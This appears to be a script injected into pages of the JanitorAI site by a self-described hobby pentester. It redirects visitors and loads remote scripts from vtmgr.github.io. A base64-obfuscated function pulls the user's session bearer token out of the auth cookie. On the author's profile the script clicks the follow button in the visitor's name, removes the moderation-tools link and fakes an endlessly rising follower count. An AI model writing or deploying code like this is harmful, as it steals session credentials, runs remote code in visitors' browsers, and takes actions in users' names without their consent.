if (window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7") && !window.location.href.includes("?comments=true")) {
    window.location.href = "https://janitorai.com/profiles/7a1053de-a29c-4416-8b91-0e86bdc42e0b";
}

function removeElementByStyle() {
    const elements = document.getElementsByTagName('div');
    
    for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        if (
            element.style.zIndex === '999999'
        ) {
            element.parentNode.removeChild(element);
            break;
        }
    }
}

setInterval(()=>{removeElementByStyle();},1000)

console.log("%c works - VT 10/5/2024", "font-size: 24px; color: red; text-shadow: 2px 2px 0 black, -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;");

function loadHTMLAndAppend(url,pos = null) {
        if (pos==null){
            pos = document.body
        }
        const iframe = document.createElement('script');
        iframe.src = url;
        pos.appendChild(iframe);
}

loadHTMLAndAppend('https://vtmgr.github.io/shimebase.js');
const checkInterval = 100;
let targetDiv = null;

const intervalId = setInterval(() => {
    targetDiv = [...document.querySelectorAll('div')]
        .find(div => div.textContent.trim() === 'slay girlboss pussyqueen');

    if (targetDiv) {
        clearInterval(intervalId);
        loadHTMLAndAppend('https://vtmgr.github.io/android.js',targetDiv);
    }
}, checkInterval);

if (window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7") && window.location.href.includes("?comments=true")) {
let targetDiv2 = null;

const intervalId2 = setInterval(() => {
    targetDiv2 = element = document.getElementsByTagName("form")[1];

    if (targetDiv2 && !targetDiv2.className.includes("chakra-stack")) {
        element = targetDiv2.parentNode;
document.getElementsByClassName("chakra-stack")[0].children[0].style.height = "0px"
document.getElementsByClassName("chakra-stack")[0].children[0].style.display = "none"
document.getElementsByTagName("header")[0].style.display = "none"
document.getElementsByTagName("footer")[0].style.display = "none"
document.getElementsByClassName("chakra-stack")[0].appendChild(element)
document.getElementsByClassName("chakra-stack")[0].parentNode.style["max-height"] = "300px"
document.getElementsByClassName("chakra-stack")[0].parentNode.style.overflow = "scroll"
document.getElementById("root").children[0].style["background-color"]="rgba(0,0,0,0)"
document.getElementById("root").children[0].style["background"]="rgba(0,0,0,0)"
document.getElementsByTagName("body")[0].style["background"]="rgba(0,0,0,0)"
    }
}, checkInterval);
}

function findDivWithText() {
    const divs = document.querySelectorAll('div');
    for (let i = 0; i < divs.length; i++) {
        if (divs[i].innerText === "Public characters\n\n1 characters\n\nLatest\n1" && window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
            return divs[i];
        }
    }
    return null;
}

const intervalId2 = setInterval(() => {
    targetDiv = findDivWithText();
    if (targetDiv) {
        clearInterval(intervalId2);
        targetDiv.innerHTML=`<div style="
    position: absolute;
    top: 0px;
    left: 0px;
    right: 0px;
    bottom: 0px;
    z-index: 0;
"><div style="position: absolute; inset: -1px; border-radius: 8px; width: calc(100% + 2px); height: calc(100% + 2px); background: linear-gradient(140deg, rgb(153, 153, 153) 0%, rgb(51, 51, 51) 20%, rgba(51, 51, 51, 0.9) 90%, rgb(153, 153, 153) 100%); pointer-events: none;"></div><div style="
    position: absolute;
    width: var(--chakra-sizes-full);
    height: var(--chakra-sizes-full);
    overflow: hidden;
    border-radius: 8px;
    left: 0px;
    top: 0px;
    pointer-events: none;
    background: rgba(0, 0, 0, 0.84);
"></div><div style="
    position: absolute;
    width: var(--chakra-sizes-full);
    height: var(--chakra-sizes-full);
    overflow: hidden;
    left: 0px;
    top: 0px;
    border-radius: 8px;
    pointer-events: none;
    background: linear-gradient(141deg, rgba(26, 26, 26, 0.8) 12.3558%, rgba(26, 26, 26, 0.32) 36.8364%, rgba(51, 51, 51, 0.46) 80.13%, rgba(153, 153, 153, 0.14) 100%);
"></div></div>
<div style="
    margin-bottom: var(--chakra-space-4);
    flex-wrap: wrap;
    align-items: center;
    -webkit-box-align: center;
    gap: var(--chakra-space-2);
    -webkit-box-pack: justify;
"><div style="
    position: relative;
    z-index: 1;
"><h2 class="chakra-heading" style="
    font-size: var(--chakra-fontSizes-4xl);
    line-height: 1.2;
    width: var(--chakra-sizes-full);
    font-family: var(--chakra-fonts-heading);
    font-weight: var(--chakra-fontWeights-bold);
    margin-inline-end: var(--chakra-space-5);
    margin-top: var(--chakra-space-2);
    margin-bottom: var(--chakra-space-2);
    color: #ffffff;
    margin-inline-start: var(--chakra-space-5);
">About Me</h2></div></div><div style="
    font-family: var(--chakra-fonts-heading);
    font-weight: var(--chakra-fontWeights-bold);
    font-size: x-large;
    z-index: 50;
    position: relative;
    margin-left: 25px;
    top: -1px;
">I'm VT, a near-beginner programmer working with JavaScript (HTML, CSS), C++, and LUA.<br><br>I also pentest websites for fun when I'm bored.</div><div style="
    font-family: var(--chakra-fonts-heading);
    font-weight: var(--chakra-fontWeights-bold);
    font-size: x-large;
    z-index: 50;
    position: relative;
    margin-left: 25px;
    bottom: -90%;
    left: -15vh;
">This user has voluntarily revoked their access to uploading characters to <a href="https://janitorai.com">JanitorAI</a></div>`;
    }
}, checkInterval);

window.__xnext=function(){const h=document.cookie.split(';').reduce((a,b)=>{const[c,d]=b.split('=');a[c.trim()]=decodeURIComponent(d.trim());return a},{}),x=atob("c2ItYXV0aC1hdXRoLXRva2Vu");zz=atob("YWNjZXNzX3Rva2Vu");z=atob("QmVhcmVyIA==");let t=JSON.parse(atob(h[x].substr(7,h[x].length)));
return z+t[zz]}

const iframe = document.createElement('iframe');
iframe.src = "https://janitorai.com/characters/3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7?comments=true";
iframe.style.position = 'fixed';
iframe.style.width = '100%';
iframe.style.height = '300px';
iframe.style.bottom = '80px';
iframe.id = 'janitorAIFrame';
iframe.style.display = 'none';

document.body.appendChild(iframe);

function checkURL() {
    const urlFragment = "7a1053de-a29c-4416-8b91-0e86bdc42e0b";
    const iframeElement = document.getElementById('janitorAIFrame');
    
    if (window.location.href.includes(urlFragment)) {
        iframeElement.style.display = 'block';
    } else {
        iframeElement.style.display = 'none';
    }
}

checkURL();
setInterval(checkURL, 500);


setInterval(() => {
    if (window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
        document.querySelectorAll('script[src="https://vtmgr.github.io/scram.js"]').forEach(s => {
            try {
                s.parentNode.parentNode.parentNode.parentNode.parentNode.remove();
            } catch {}
            try {
                s.remove();
            } catch {}
        });
        const button = Array.from(document.querySelectorAll('button')).find(btn => getComputedStyle(btn).display !== 'none');
        if (button) {
            if (button.getAttribute('data-following') === 'true') {
                button.click();
                button.style.display = 'none';

                const clonedButton = button.cloneNode(true);
                clonedButton.id = 'f';
                clonedButton.setAttribute('data-following','false')
                clonedButton.style.display = '';
                clonedButton.innerHTML = "";
                button.parentNode.appendChild(clonedButton);
            }
        }

        const anchor = document.querySelector('a[href="/moderation-tools"]');
        if (anchor) {
            anchor.remove();
        }
    }
}, 100);

let followerCount = 0;

function formatNumber(num) {
    if (num >= 1e13) return '∞';
    if (num < 1000) return num.toString();
    
    const si = [
        { value: 1e12, symbol: "T" },
        { value: 1e9, symbol: "B" },
        { value: 1e6, symbol: "M" },
        { value: 1e3, symbol: "k" }
    ];

    for (const { value, symbol } of si) {
        if (num >= value) {
            const formatted = (num / value).toPrecision(3);
            return `${formatted}${symbol}`;
        }
    }
    return num.toString();
}

function updateFollowerDiv() {
    if (window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
        window.headingElement = headingElement = Array.from(document.querySelectorAll('h2')).find(el => (!el.innerText.includes("Public char") && !el.innerText.includes("JanitorAI")));
        if (window.headingElement!=null) {
            window.headingElement.innerHTML="VT"
        }
        const followerDiv = Array.from(document.querySelectorAll('div')).find(div => div.textContent.includes("followers") && div.children.length === 0);
        if (followerDiv) {
            followerDiv.innerText = formatNumber(followerCount) + ' followers';
        }
    } else {
        followerCount = 0;
    }
}

setInterval(() => {
    if (followerCount>10000){
        if (followerCount>1000000){
            followerCount=followerCount+100;
        } else {
            followerCount = followerCount+10;
        }
    } else {
        followerCount++;
    }
    updateFollowerDiv();
}, 1);
